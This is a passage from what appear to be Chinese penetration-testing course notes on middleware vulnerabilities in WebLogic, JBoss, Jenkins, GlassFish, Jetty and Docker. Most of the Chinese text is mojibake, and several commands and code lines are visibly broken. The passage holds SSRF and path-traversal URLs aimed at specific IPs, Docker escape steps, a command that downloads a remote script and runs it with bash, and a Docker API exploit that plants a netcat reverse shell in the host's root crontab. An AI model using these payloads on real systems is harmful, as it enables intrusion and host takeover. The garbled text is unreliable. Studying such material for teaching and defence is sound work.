<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™ä¸ªåœ¨æœ€è¿‘æ‰“çš„ä¸€ä¸ªæ¸—é€é¶åœºä¸­ä¹Ÿå‡ºç°äº†å¥½å‡ é¢˜ç›¸å…³çš„é¢˜ç›®ï¼Œè™½ç„¶å¯ä»¥ç»•è¿‡ç›´æ¥è¿›å…¥åå°ï¼Œä½†åªæ˜¯ä½æƒé™ç”¨æˆ·ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§ä½œç”¨ï¼Œä¸»è¦æ¼æ´ç‚¹ä¸€èˆ¬æƒ…å†µä¸‹è½½å¦ä¸€ä¸ªç•Œé¢ä¸­çš„ssrfæ¼æ´</span><br><span class="line">http://175.27.135.16:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=127.0.0.1:7000</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://cloud.tencent.com/developer/article/2202740">https://cloud.tencent.com/developer/article/2202740</a> </p>
<h6 id="ï¼ˆ5ï¼‰CVE-2021-2394-ååºåˆ—åŒ–æ¼æ´"><a href="#ï¼ˆ5ï¼‰CVE-2021-2394-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ï¼ˆ5ï¼‰CVE-2021-2394 ååºåˆ—åŒ–æ¼æ´"></a>ï¼ˆ5ï¼‰CVE-2021-2394 ååºåˆ—åŒ–æ¼æ´</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    æ­¤ä¸ºWebLogicç»„ä»¶å­˜åœ¨é«˜å±æ¼æ´ï¼Œæ¼æ´ä¸»è¦æ˜¯FilterExtractorçš„readExternalæ–¹æ³•ä½¿ç”¨ä¸å½“ï¼Œä½¿å¾—ç”Ÿæˆ MethodAttributeAccessorçš„æ—¶å€™ä¸ä¼šå—åˆ°é»‘åå•çš„é™åˆ¶ã€‚æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´çš„æ”»å‡»è€…å¯ä»¥è·å–WebLogic Serverç®¡ç†æƒé™ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    Oracle WebLogic Server 10.3.6.0.0

    Oracle WebLogic Server 12.1.3.0.0

    Oracle WebLogic Server 12.2.1.3.0

    Oracle WebLogic Server 12.2.1.4.0

    Oracle WebLogic Server 14.1.1.0.0
</code></pre>
<p>è¿™é‡Œç”¨vulhubçš„CVE-2020-14882çš„æ¼æ´ç¯å¢ƒæ¥ä»£æ›¿ï¼ˆç‰ˆæœ¬ä¸€è‡´ï¼‰</p>
<p>å¯ä»¥ç›´æ¥ä½¿ç”¨å·¥å…·å»è¿æ¥å­˜åœ¨æ¼æ´çš„é¡µé¢ï¼Œä»è€Œç›´æ¥å¯ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p>
<h5 id="2ã€ä¸­é—´ä»¶-JBoos-CVE-å¼±å£ä»¤"><a href="#2ã€ä¸­é—´ä»¶-JBoos-CVE-å¼±å£ä»¤" class="headerlink" title="2ã€ä¸­é—´ä»¶-JBoos-CVE&amp;å¼±å£ä»¤"></a>2ã€ä¸­é—´ä»¶-JBoos-CVE&amp;å¼±å£ä»¤</h5><p>ç®€ä»‹ï¼š</p>
<pre><code>    Jboss é€šå¸¸å ç”¨çš„ç«¯å£æ˜¯ 1098ï¼Œ1099ï¼Œ4444ï¼Œ4445ï¼Œ8080ï¼Œ8009ï¼Œ8083ï¼Œ8093 è¿™
</code></pre>
<p>å‡ ä¸ªï¼ŒRed Hat JBoss Application Server æ˜¯ä¸€æ¬¾åŸºäº JavaEE çš„å¼€æºåº”ç”¨æœåŠ¡å™¨ã€‚</p>
<p>ï¼ˆ1ï¼‰CVE-2017-12149  ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p>
<p>ç®€ä»‹ï¼š</p>
<pre><code>    JBOSS Application Serveræ˜¯ä¸€ä¸ªåŸºäºJE22çš„å¼€æ”¾æºä»£ç çš„åº”ç”¨æœåŠ¡å™¨ï¼Œåœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œå‘ç° HTTP Invoker çš„ ReadOnlyAccessFilter ä¸­çš„ doFilter æ–¹æ³•ä¸é™åˆ¶å®ƒæ‰§è¡Œååºåˆ—åŒ–çš„ç±»ï¼Œå› æ­¤å…è®¸æ”»å‡»è€…é€šè¿‡æ„å»ºç‰¹æ®Šçš„çš„åºåˆ—åŒ–æ•°æ®æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ— éœ€ç”¨æˆ·éªŒè¯å³å¯è·å¾—æœåŠ¡å™¨çš„æ§åˆ¶æƒã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    5.xå’Œ6.xç‰ˆæœ¬çš„JBOSSAS
</code></pre>
<h6 id="ï¼ˆ2ï¼‰CVE-2017-7504-ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#ï¼ˆ2ï¼‰CVE-2017-7504-ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="ï¼ˆ2ï¼‰CVE-2017-7504  ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>ï¼ˆ2ï¼‰CVE-2017-7504  ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    Jboss AS 4.XåŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­çš„JbossMQå®ç°è¿‡ç¨‹çš„JMS over HTTP Invocation Layerçš„HTTPServerILServlet.javaæ–‡ä»¶å­˜åœ¨å®‰å…¨æ¼æ´ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„åºåˆ—åŒ–æ•°æ®åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    JBoss AS&lt;=4.x
</code></pre>
<h6 id="3ï¼‰å¼±å£ä»¤-æœªæˆæƒè®¿é—®"><a href="#3ï¼‰å¼±å£ä»¤-æœªæˆæƒè®¿é—®" class="headerlink" title="3ï¼‰å¼±å£ä»¤ æœªæˆæƒè®¿é—®"></a>3ï¼‰å¼±å£ä»¤ æœªæˆæƒè®¿é—®</h6><p>ç®€ä»‹ï¼š</p>
<p>â€‹    éƒ¨ç½²jbossæ—¶ç®¡ç†å‘˜æœ‰æ—¶ä¼šå¿½ç•¥ä¿®æ”¹å¯†ç å¯¼è‡´å¼±å£ä»¤ï¼Œåˆæˆ–è€…æ— å¯†ç å¯ä»¥ç›´æ¥è®¿é—®åå°å¯¼è‡´æœªæˆæƒè®¿é—®ã€‚</p>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<p>â€‹    å…¨ç‰ˆæœ¬</p>
<h5 id="3ã€ä¸­é—´ä»¶-Jenkins-CVE"><a href="#3ã€ä¸­é—´ä»¶-Jenkins-CVE" class="headerlink" title="3ã€ä¸­é—´ä»¶-Jenkins-CVE"></a>3ã€ä¸­é—´ä»¶-Jenkins-CVE</h5><p>ç®€ä»‹ï¼š</p>
<p>â€‹    Jenkins æ˜¯ä¸€ä¸ªç”¨ Java ç¼–å†™çš„å¼€æºè‡ªåŠ¨åŒ–å·¥å…·ï¼Œæ˜¯åŸºäºJavaå¼€å‘çš„ä¸€ç§æŒç»­é›†æˆå·¥å…·ï¼Œç”¨äºç›‘æ§æŒç»­é‡å¤çš„å·¥ä½œã€‚é»˜è®¤ç«¯å£:8080</p>
<h6 id="ï¼ˆ1ï¼‰CVE-2017-1000353-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#ï¼ˆ1ï¼‰CVE-2017-1000353-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="ï¼ˆ1ï¼‰CVE-2017-1000353  è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>ï¼ˆ1ï¼‰CVE-2017-1000353  è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    è¯¥æ¼æ´å­˜åœ¨äºä½¿ç”¨HTTPåè®®çš„åŒå‘é€šä¿¡é€šé“çš„å…·ä½“å®ç°ä»£ç ä¸­ï¼ŒJenkinsåˆ©ç”¨æ­¤é€šé“æ¥æ¥æ”¶å‘½ä»¤ï¼Œæ¶æ„æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ”»å‡»å‚æ•°è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼Œä»è€Œè·å–ç³»ç»Ÿæƒé™ï¼Œé€ æˆæ•°æ®æ³„éœ²ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    æ‰€æœ‰Jenkinsä¸»ç‰ˆæœ¬å‡å—åˆ°å½±å“(åŒ…æ‹¬&lt;=2.56ç‰ˆæœ¬)
    æ‰€æœ‰Jenkins LTS å‡å—åˆ°å½±å“(åŒ…æ‹¬&lt;=2.46.1ç‰ˆæœ¬)
</code></pre>
<h6 id="ï¼ˆ2ï¼‰CVE-2018-1000861-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-ï¼ˆæœªå®Œæˆï¼‰"><a href="#ï¼ˆ2ï¼‰CVE-2018-1000861-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-ï¼ˆæœªå®Œæˆï¼‰" class="headerlink" title="ï¼ˆ2ï¼‰CVE-2018-1000861  è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ ï¼ˆæœªå®Œæˆï¼‰"></a>ï¼ˆ2ï¼‰CVE-2018-1000861  è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ ï¼ˆæœªå®Œæˆï¼‰</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    jenkinsä½¿ç”¨Staplerå¼€å‘ï¼Œåœ¨stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java ä¸­ä½¿ç”¨çš„ Stapler Web æ¡†æ¶ä¸­å­˜åœ¨ä¸€ä¸ªä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡è®¿é—®æ„å»ºç‰¹æ®Šçš„ URL æ¥è°ƒç”¨ Java å¯¹è±¡ä¸Šçš„æŸäº›æ–¹æ³•è·å–æƒé™ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    Jenkinsä¸»ç‰ˆæœ¬ &lt;= 2.153
    Jenkins LTSç‰ˆæœ¬ &lt;= 2.138.3
</code></pre>
<h6 id="3ï¼‰CVE-2019-100300-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆæ¡ä»¶è‹›åˆ»ï¼‰"><a href="#3ï¼‰CVE-2019-100300-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆæ¡ä»¶è‹›åˆ»ï¼‰" class="headerlink" title="3ï¼‰CVE-2019-100300  è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆæ¡ä»¶è‹›åˆ»ï¼‰"></a>3ï¼‰CVE-2019-100300  è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆæ¡ä»¶è‹›åˆ»ï¼‰</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    åœ¨src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java ä¸­å­˜åœ¨ä¸€ä¸ªæ²™ç›’ç»•è¿‡æ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸èƒ½æä¾›æ²™ç›’è„šæœ¬çš„æ”»å‡»è€…åœ¨ Jenkins master JVM ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    Pipeline: Declarative æ’ä»¶ &lt;= 1.3.4
    Pipeline: Groovy æ’ ä»¶ &lt;= 2.61
    Script Security æ’ ä»¶ &lt;= 1.49
</code></pre>
<p>è¯¥æ¼æ´éœ€è¦æå‰çŸ¥é“ç®¡ç†å‘˜ç”¨æˆ·è´¦å·å’Œå¯†ç æ‰èƒ½è¿›è¡Œåˆ©ç”¨ï¼Œåˆ©ç”¨ä»·å€¼ä¸é«˜</p>
<h5 id="4ã€ä¸­é—´ä»¶-GlassFish-CVE"><a href="#4ã€ä¸­é—´ä»¶-GlassFish-CVE" class="headerlink" title="4ã€ä¸­é—´ä»¶-GlassFish-CVE"></a>4ã€ä¸­é—´ä»¶-GlassFish-CVE</h5><p>ç®€ä»‹ï¼š</p>
<pre><code>    GlassFish æ˜¯ä¸€æ¬¾å¼ºå¥çš„å•†ä¸šå…¼åº”ç”¨æœåŠ¡å™¨ï¼Œè¾¾åˆ°äº§å“çº§è´¨é‡ï¼Œå¯å…è´¹ç”¨äºå¼€å‘ã€éƒ¨ç½²å’Œé‡æ–°åˆ†å‘ã€‚å¼€å‘è€…å¯ä»¥å…è´¹è·å¾—æºä»£ç ï¼Œè¿˜å¯ä»¥å¯¹ä»£ç è¿›è¡Œæ›´æ”¹ã€‚é»˜è®¤ç«¯å£ä¸º4848ã€‚
</code></pre>
<h6 id="ï¼ˆ1ï¼‰CVE-2017-1000028-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"><a href="#ï¼ˆ1ï¼‰CVE-2017-1000028-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="ï¼ˆ1ï¼‰CVE-2017-1000028 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"></a>ï¼ˆ1ï¼‰CVE-2017-1000028 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    Oracle çš„ GlassFish Server Open Source Edition 4.1 å®¹æ˜“å—åˆ°ç»è¿‡èº«ä»½éªŒè¯å’Œæœªç»èº«ä»½éªŒè¯çš„ç›®å½•éå†æ¼æ´çš„æ”»å‡»ï¼Œå¯ä»¥é€šè¿‡å‘å‡ºç‰¹åˆ¶çš„ HTTP GET è¯·æ±‚æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>   GlassFish &lt;= 4.1.2
</code></pre>
<h6 id="ï¼ˆ2ï¼‰ç®€å•å£ä»¤-Getshell-ï¼ˆgetshellå¤±è´¥ï¼‰"><a href="#ï¼ˆ2ï¼‰ç®€å•å£ä»¤-Getshell-ï¼ˆgetshellå¤±è´¥ï¼‰" class="headerlink" title="ï¼ˆ2ï¼‰ç®€å•å£ä»¤&amp;Getshell ï¼ˆgetshellå¤±è´¥ï¼‰"></a>ï¼ˆ2ï¼‰ç®€å•å£ä»¤&amp;Getshell ï¼ˆgetshellå¤±è´¥ï¼‰</h6><p>ç®€ä»‹ï¼š</p>
<p>â€‹    éƒ¨ç½²Glassfishæ—¶ç®¡ç†å‘˜æœ‰æ—¶ä¼šå¿½ç•¥ä¿®æ”¹å¯†ç å¯¼è‡´å¼±å£ä»¤ï¼Œåˆæˆ–è€…æ— å¯†ç å¯ä»¥ç›´æ¥è®¿é—®åå°å¯¼è‡´æœªæˆæƒè®¿é—®ã€‚</p>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<p>â€‹    å…¨ç‰ˆæœ¬ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é™„åŠ ï¼šä¸»è¦å…¶å®å°±æ˜¯Weblogicä¸ªäººæ„Ÿè§‰æ›´ä¸ºå¸¸è§ç‚¹ï¼Œæ‰€ä»¥å¯¹äºå…¶ä»–çš„ä¸­é—´ä»¶å°±æ²¡åšå¤ªè¿‡å¤šçš„æ”¶é›†ï¼Œéƒ½æ˜¯ä¸€äº›ç›¸å…³CVEï¼Œä½¿ç”¨æœç´¢å¼•æ“ä¹Ÿå¾ˆå®¹æ˜“å»æœåˆ°ç›¸å…³çš„poc</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬61å¤©-æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨-CVEå¤ç°-K8S-Docker-Jetty-Websphere"><a href="#ç¬¬61å¤©-æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨-CVEå¤ç°-K8S-Docker-Jetty-Websphere" class="headerlink" title="ç¬¬61å¤© æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨&amp;CVEå¤ç°&amp;K8S&amp;Docker&amp;Jetty&amp;Websphere"></a>ç¬¬61å¤© æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨&amp;CVEå¤ç°&amp;K8S&amp;Docker&amp;Jetty&amp;Websphere</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-41"><a href="#çŸ¥è¯†ç‚¹ï¼š-41" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>0ã€ä¸­é—´ä»¶-K8så®‰å…¨<br>1ã€ä¸­é—´ä»¶Jeyå®‰å…¨<br>2ã€ä¸­é—´ä»¶-Dockerå®‰å…¨<br>3.ä¸­é—´ä»¶-WebSphere:å®‰å…¨</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-7"><a href="#ç« èŠ‚å†…å®¹ï¼š-7" class="headerlink" title="ç« èŠ‚å†…å®¹ï¼š"></a>ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§ä¸­é—´ä»¶çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-è§£æ&amp;å¼±å£ä»¤<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶-å¼±å£ä»¤çˆ†ç ´æ”»å‡»<br>4ã€å®‰å…¨åº”ç”¨æ¡†æ¶ç‰¹å®šå®‰å…¨æ¼æ´</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-10"><a href="#å‰ç½®çŸ¥è¯†ï¼š-10" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h4><p>ä¸­é—´ä»¶å®‰å…¨ä¾§è¯•æµç¨‹ï¼š<br>1ã€åˆ¤æ–­ä¸­é—´ä»¶ä¿¡æ¯åç§°&amp;ç‰ˆæœ¬&amp;ä¸‰æ–¹<br>2ã€åˆ¤æ–­ä¸­é—´ä»¶é—®é¢˜-é…ç½®ä¸å½“&amp;å…¬å¼€æ¼æ´<br>3ã€åˆ¤æ–­ä¸­é—´ä»¶åˆ©ç”¨-å¼±å£ä»¤&amp;EXP&amp;æ¡†æ¶æ¼æ´<br>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ è¾“&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼æŒå®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹-3"><a href="#æ¼”ç¤ºæ¡ˆä¾‹-3" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h4><p>ä¸­é—´ä»¶K8s-æœå“ˆ<br>ä¸­é—´ä»¶Jety-æœå“ˆ<br>ä¸­é—´ä»¶Docker-æœå“ˆ<br>ä¸­é—´ä»¶-WebSphere-æœå“ˆ<br>é…åˆä¸‹-Fofa_Viewer-æœå“ˆ</p>
<p>ä¸­é—´ä»¶-K8s-æœå“ˆ<br>kubernetestç®€ç§°k8s,æ˜¯ä¸€ä¸ªç”±googleå¼€æºçš„ï¼Œç”¨äºè‡ªåŠ¨éƒ¨æš‘ï¼Œæ‰©å±•å’Œç®¡ç†å®¹å™¨åŒ–åº”ç”¨ç¨‹åºçš„å¼€æºç³»ç»Ÿã€‚åœ¨Bç«™å†…éƒ¨ï¼Œk8såœ¨ç®¡ç†ç”Ÿäº§çº§å®¹å™¨å’Œåº”ç”¨æœåŠ¡éƒ¨ç½²å·²ç»æœ‰è¾ƒä¸ºå¹¿æ³›å’Œæˆç†Ÿçš„åº”ç”¨ã€‚é€šè¿‡kK8$,å¯è·¨å¤šå°ä¸»æœºè¿›è¡Œå®¹å™¨ç¼–æ’ã€å¿«é€ŸæŒ‰éœ€æ‰©å±•å®¹å™¨åº”ç”¨åŠå…¶èµ„æºã€å¯¹åº”<br>ç”¨å®æ–½çŠ¶å†µæ£€æŸ¥ã€æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡è¡—ç­‰ã€‚<br><a href="https://blog.csdn.net/w1590191166/article/details/122028001">https://blog.csdn.net/w1590191166/article/details/122028001</a></p>
<p>ä¸­é—´ä»¶Jetty-æœå“ˆ<br>Elipse Jettyæ˜¯ä¸€ä¸ªå¼€æºçš„servletå®¹å™¨ï¼Œå®ƒä¸ºåŸºäºJavaçš„Webå®¹å™¨æä¾›è¿è¡Œç¯å¢ƒã€‚<br>CVE-2021-28164<br><a href="http://123.58.236.76.63126/WEB-INF/web.Xxml">http://123.58.236.76.63126/%2e/WEB-INF/web.Xxml</a><br>CVE-2021-28169<br><a href="http://123.58.236.76:63126/static?/WEB-INF/web.xml">http://123.58.236.76:63126/static?/WEB-INF/web.xml</a><br>CVE-2021-34429<br>http:&#x2F;123.58.236.76:63126&#x2F;%u002eWEB-NF&#x2F;web.xml</p>
<p>ä¸­é—´ä»¶-Docker-æœå“ˆ<br>Dockerå®¹å™¨æ˜¯ä½¿ç”¨æ²™ç›’æœºåˆ¶ï¼Œæ˜¯å•ç‹¬çš„ç³»ç»Ÿï¼Œç†è®ºä¸Šæ˜¯å¾ˆå®‰å…¨çš„ï¼Œé€šè¿‡åˆ©ç”¨æŸç§æ‰‹æ®µï¼Œå†ç»“åˆæ‰§è¡ŒPOCæˆ–EXP,å°±å¯ä»¥è¿”å›ä¸€ä¸ªå®¿ä¸»æœºçš„é«˜æƒé™Shll,å¹¶æ‹¿åˆ°å®¿ä¸»æœºçš„rootæƒé™ï¼Œå¯ä»¥ç›´æ¥æ“ä½œå®¿ä¸»æœºæ–‡ä»¶ã€‚å®ƒä»å®¹å™¨ä¸­é€ƒäº†å‡ºæ¥ï¼Œå› æ­¤æˆ‘ä»¬å½¢è±¡çš„ç§°ä¸ºDockerié€ƒé€¸æ¼æ´ã€‚<br>1ã€å®¹å™¨åˆ¤æ–­ï¼šåˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯å®¹å™¨ç¯å¢ƒ<br>-æ˜¯å¦å­˜åœ¨.dockerenvæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Is -alh /.dockerenv</span><br></pre></td></tr></table></figure>

<p>æŸ¥é—´ç³»ç»Ÿè¿›ç¨‹çš„cgroupä¿¡æ¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>

<p>2ã€å®¹å™¨é€ƒé€¸æ¼æ´ï¼šæƒé™æå‡<br>-ç”±ä¸¤æ ¸æ¼æ´å¼•èµ·ä¸€DirtyC0W(CVE-2016-5195)<br>-ç”±Dockerè½¯ä»¶è®¾è®¡å¼•èµ·CVE-2019-5736ã€CVE-2019-14271,CVE-2020-15257<br>ç”±é…ç½®ä¸å½“å¼•èµ·ä¸€å¼€å¯privilegedï¼ˆç‰¹æƒæ¨¡å¼ï¼‰+å®¿ä¸»æœºç›®å½•æŒ‚è½½ï¼ˆæ–‡ä»¶æŒ‚è½½ï¼‰ã€åŠŸèƒ½<br>(capabilities)æœºåˆ¶ã€socké€šä¿¡æ–¹å¼<br>CVE-2016-5195<br><a href="https://github.com/gebl/dirtycow-docker-vdso">https://github.com/gebl/dirtycow-docker-vdso</a><br><a href="https://www.ichunqiu.com/experiment/catalog?id=100295">https://www.ichunqiu.com/experiment/catalog?id=100295</a><br>ç¬¬ä¸€æ­¥ã€å¯åŠ¨å®¹å™¨ï¼š<br>#ä½¿ç”¨æœ¬åœ°1234ç«¯å£è¿æ¥dockerçš„1234ç«¯å£è¿è¡Œdirtycowé•œåƒï¼Œå¹¶å°†å…¶ä¸´æ—¶å‘½åä¸ºtest<br>#å…¶ä¸­test:ä¸ºä¸´æ—¶åç§°ï¼Œå¯ä»¥è‡ªå®šä¹‰å¡«å†™ã€‚p:ç¬¬ä¸€ä¸ªç«¯å£ä¸ºæœ¬æœºçš„ç«¯å£ï¼Œç¬¬äºŒä¸ªç«¯å£<br>ä¸ºDockerçš„ç«¯å£ã€‚-td:æ„æ€æ˜¯åœ¨åå°è¿è¡Œï¼Œäº¤äº’å¼è¿è¡Œï¼Œå¹¶ä¸”è¾“å‡ºå½“å‰çš„ä¿¡æ¯<br>bin&#x2F;bash:è°ƒç”¨Shel</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name=test-p 1234:1234 -itd dirtycow /bin/bash</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒéƒ¨ã€è¿›å…¥å®¹å™¨ï¼š<br>#è¿›å…¥é•œåƒå†…éƒ¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec-it test /bin/bash</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰æ­¥ã€<br>#ç¼–è¯‘å¹¶è¿è¡ŒPOC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /dirtycow-vdso/</span><br><span class="line">make</span><br><span class="line">/0xdeadbeef</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œæ“ä½œå³å¯ä½œç”¨å®¿ä¸»æœº</p>
<p>-CVE-2019-5736<br>å‚è€ƒï¼šhttps:&#x2F;&#x2F;&#x2F;blog.51cto.com&#x2F;u_15060465&#x2F;4336524<br>å¤ç°ï¼šcurl<br><a href="https://aist_githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw">https://aist_githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw</a> -o<br>install.sh &amp;bash install.sh<br>1ã€ä¸‹è½½POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Frichetten/CVE-2019-5736-PoC</span><br></pre></td></tr></table></figure>

<p>2ã€ä¿®æ”¹ç¼–è¯‘ç”Ÿæˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<p>2ã€ä¿®æ”¹ç¼–è¯‘ç”Ÿæˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>


<p>3.å°†è¯¥payloadæ‹·è´åˆ°dockerå®¹å™¨ä¸­ï¼ˆæ­¤æ—¶å¯ä»¥æ¨¡æ‹Ÿæ”»å‡»è€…è·å–äº†dockerå®¹å™¨æƒé™ï¼Œåœ¨å®¹å™¨<br>ä¸­ä¸Šä¼ payloadè¿›è¡Œdockerié€ƒé€¸ï¼‰å¹¶æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp main ecca872da49d:/home</span><br><span class="line">docker exec-it ecca872da49d bash</span><br><span class="line">cd /home/</span><br><span class="line">chmod 777 main</span><br><span class="line">/main</span><br></pre></td></tr></table></figure>

<p>4ã€å†æ¬¡è¿›å…¥dockeré•œåƒåç›‘å¬å³å¯æ”¶åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec-té•œåƒID bash</span><br><span class="line">nc -lwvp</span><br></pre></td></tr></table></figure>

<p>3ã€å®¹å™¨å®‰å…¨æ¼æ´<br>dockeræœªæˆæƒè®¿é—®æ¼æ´-vulhub-exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import docker</span><br><span class="line">client docker.DockerClient(base_url=&#x27;http://IP:2375/)</span><br><span class="line">data=client.containers.run(alpine:latest&#x27;,r&quot;sh-c&quot;echousr/bin/ncåå¼¹IPç«¯â˜-e</span><br><span class="line">bin/sh&#x27;&gt;&gt;/tmp/etc/crontabs/root&quot;&quot;,remove=True,volumes=f/etc&quot;:(bind&#x27;:&#x27;/tmp/etc&#x27;,</span><br><span class="line">&#x27;mode&#x27;:&#x27;nw)))</span><br></pre></td></tr></table></figure>

